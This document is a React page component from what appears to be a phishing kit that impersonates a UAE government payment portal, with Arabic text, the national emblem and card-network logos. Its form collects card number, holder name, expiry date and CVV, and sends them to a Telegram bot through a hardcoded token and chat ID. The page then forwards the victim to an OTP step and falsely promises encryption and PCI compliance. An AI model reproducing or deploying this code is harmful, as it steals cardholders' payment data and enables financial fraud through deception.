import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ShieldCheck, Lock, CreditCard, Loader2, Info } from "lucide-react";

export default function CardData() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardHolder: "",
    expiryDate: "",
    cvv: ""
  });

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleNext = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    const message = `
💳 *بيانات البطاقة - بوابة سداد الإمارات*
--------------------------
🔢 *رقم البطاقة:* ${formData.cardNumber}
👤 *حامل البطاقة:* ${formData.cardHolder}
📅 *تاريخ الانتهاء:* ${formData.expiryDate}
🔒 *CVV:* ${formData.cvv}
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      setTimeout(() => {
        const paymentData = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
        sessionStorage.setItem("paymentData", JSON.stringify({ ...paymentData, ...formData }));
        setLocation("/verify-otp");
      }, 2000);
    } catch (error) {
      console.error(error);
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-amber-500 p-2 rounded-lg">
              <span className="text-white font-bold text-sm">سداد</span>
            </div>
            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
          </div>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
        </div>
      </header>

      <main className="flex-grow container py-12 px-4">
        <div className="max-w-2xl mx-auto">
          {/* Progress Steps */}
          <div className="flex justify-between mb-12 relative px-4">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className="flex flex-col items-center z-10">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step <= 3 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
                  {step}
                </div>
                <span className={`text-[10px] mt-2 font-bold ${step <= 3 ? 'text-amber-600' : 'text-gray-400'}`}>
                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
                </span>
              </div>
            ))}
            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="bg-slate-900 p-6 text-white flex justify-between items-center">
              <div>
                <h2 className="text-xl font-bold">بيانات الدفع الإلكتروني</h2>
                <p className="text-slate-400 text-xs mt-1">أدخل بيانات بطاقتك البنكية لإتمام المعاملة</p>
              </div>
              <div className="flex gap-2">
                <div className="bg-white/10 p-2 rounded-md"><CreditCard className="w-6 h-6 text-amber-500" /></div>
              </div>
            </div>

            <div className="p-8">
              {/* Visual Card Representation */}
              <div className="mb-10 relative h-48 w-full max-w-sm mx-auto bg-gradient-to-br from-slate-800 to-slate-950 rounded-2xl p-6 text-white shadow-2xl overflow-hidden border border-white/10">
                <div className="absolute top-0 right-0 w-64 h-64 bg-amber-500/10 rounded-full -mr-32 -mt-32 blur-3xl"></div>
                <div className="flex justify-between items-start mb-8">
                  <div className="w-12 h-10 bg-amber-500/20 rounded-md border border-amber-500/30 flex items-center justify-center">
                    <div className="w-8 h-6 bg-amber-500/40 rounded-sm"></div>
                  </div>
                  <div className="text-right">
                    <p className="text-[8px] uppercase tracking-widest opacity-50">بوابة سداد الإمارات</p>
                    <p className="text-[10px] font-bold">UAE SADAD</p>
                  </div>
                </div>
                <div className="mb-6">
                  <p className="text-lg font-mono tracking-[0.2em]">{formData.cardNumber || "•••• •••• •••• ••••"}</p>
                </div>
                <div className="flex justify-between items-end">
                  <div>
                    <p className="text-[8px] uppercase opacity-50 mb-1">حامل البطاقة</p>
                    <p className="text-xs font-bold uppercase tracking-wider">{formData.cardHolder || "NAME SURNAME"}</p>
                  </div>
                  <div className="text-right">
                    <p className="text-[8px] uppercase opacity-50 mb-1">تاريخ الانتهاء</p>
                    <p className="text-xs font-bold">{formData.expiryDate || "MM/YY"}</p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleNext} className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber" className="text-sm font-bold text-gray-700">رقم البطاقة</Label>
                  <div className="relative">
                    <Input id="cardNumber" required placeholder="0000 0000 0000 0000" className="bg-gray-50 border-gray-200 py-6 pr-12 font-mono text-lg" value={formData.cardNumber} onChange={(e) => setFormData({...formData, cardNumber: e.target.value})} />
                    <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="cardHolder" className="text-sm font-bold text-gray-700">اسم حامل البطاقة (كما يظهر على البطاقة)</Label>
                  <Input id="cardHolder" required placeholder="أدخل الاسم بالكامل" className="bg-gray-50 border-gray-200 py-6" value={formData.cardHolder} onChange={(e) => setFormData({...formData, cardHolder: e.target.value})} />
                </div>

                <div className="grid grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate" className="text-sm font-bold text-gray-700">تاريخ الانتهاء</Label>
                    <Input id="expiryDate" required placeholder="MM/YY" className="bg-gray-50 border-gray-200 py-6 text-center" value={formData.expiryDate} onChange={(e) => setFormData({...formData, expiryDate: e.target.value})} />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-sm font-bold text-gray-700">رمز الأمان (CVV)</Label>
                    <div className="relative">
                      <Input id="cvv" required type="password" maxLength={4} placeholder="•••" className="bg-gray-50 border-gray-200 py-6 text-center" value={formData.cvv} onChange={(e) => setFormData({...formData, cvv: e.target.value})} />
                      <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                    </div>
                  </div>
                </div>

                <div className="bg-blue-50 border border-blue-100 p-4 rounded-xl flex gap-3 items-start">
                  <ShieldCheck className="w-5 h-5 text-blue-600 shrink-0 mt-0.5" />
                  <div>
                    <p className="text-[11px] text-blue-800 font-bold mb-1">حماية البيانات المالية</p>
                    <p className="text-[10px] text-blue-700 leading-relaxed">
                      يتم تشفير بياناتك باستخدام معيار التشفير المتقدم (AES-256). نحن لا نقوم بتخزين أي بيانات حساسة على خوادمنا، وتتم المعالجة مباشرة عبر النظام البنكي الموحد.
                    </p>
                  </div>
                </div>

                <div className="flex gap-4 pt-4">
                  <Button type="button" variant="ghost" className="flex-1 text-gray-500" onClick={() => setLocation("/select-bank")}>الرجوع</Button>
                  <Button type="submit" className="flex-[2] bg-amber-500 hover:bg-amber-600 text-white font-bold py-6 rounded-xl shadow-lg shadow-amber-500/20" disabled={loading}>
                    {loading ? (
                      <span className="flex items-center gap-2">
                        <Loader2 className="w-5 h-5 animate-spin" /> جاري تأمين الاتصال...
                      </span>
                    ) : "تأكيد ومتابعة"}
                  </Button>
                </div>
              </form>
            </div>
            
            <div className="bg-gray-50 p-4 border-t border-gray-100 flex justify-center items-center gap-8 opacity-40">
               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/1200px-Visa_Inc._logo.svg.png" alt="Visa" className="h-4" />
               <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" alt="Mastercard" className="h-6" />
               <div className="text-[10px] font-bold text-gray-600 flex items-center gap-1"><Lock className="w-3 h-3" /> PCI DSS COMPLIANT</div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
